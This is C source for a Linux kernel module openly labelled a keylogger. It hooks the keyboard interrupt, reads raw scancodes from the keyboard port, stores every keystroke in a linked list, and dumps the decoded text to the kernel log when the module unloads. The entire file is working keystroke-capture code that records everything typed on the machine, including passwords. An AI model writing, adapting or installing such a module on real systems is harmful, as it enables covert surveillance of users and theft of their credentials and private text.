#include "./keyboard.h"

MODULE_AUTHOR("SegFault42 <SegFault42@protonmail.com>");
MODULE_DESCRIPTION("keylogger");
MODULE_LICENSE("GPL");

extern t_key	*first;

static irqreturn_t kbd2_isr(int irq, void *dev_id)
{
	unsigned char	scancode;

	scancode = inb(KBD_DATA_REG);
	if (strlen(key_name[scancode]) != 0)
		add_tail(scancode);

	return IRQ_HANDLED;
}

static int __init kbd2_init(void)
{
	pr_info("Keylogger ON\n");

	create_misc();

	return request_irq(KBD_IRQ, kbd2_isr, IRQF_SHARED, "kbd2", (void *)kbd2_isr);
}

static void	print_log(void)
{
	t_key	*tmp = first;
	char	buff[BUFF_SIZE] = {0};
	size_t	idx = 0;

	pr_info("Full log :\n");

	while (tmp != NULL) {
		if (keyboard_map[tmp->key] && tmp->state && tmp->key < 80) {
			if (keyboard_map[tmp->key] != '\n') {
				if (idx == BUFF_SIZE - 1) {
					pr_info("%s", buff);
					memset(&buff, 0, BUFF_SIZE);
					idx = 0;
				}
				buff[idx] = keyboard_map[tmp->key];
				idx++;
			}
			else {
				pr_info("%s", buff);
				memset(&buff, 0, BUFF_SIZE);
				idx = 0;
			}
		}
		tmp = tmp->next;
	}
	pr_info("%s", buff);
}

static void __exit kbd2_exit(void)
{
	print_log();

	// free and destroy
	free_lst();
	free_irq(KBD_IRQ, (void *)kbd2_isr);
	destroy_misc();
	pr_info("Keylogger OFF\n");
}

module_init(kbd2_init);
module_exit(kbd2_exit);
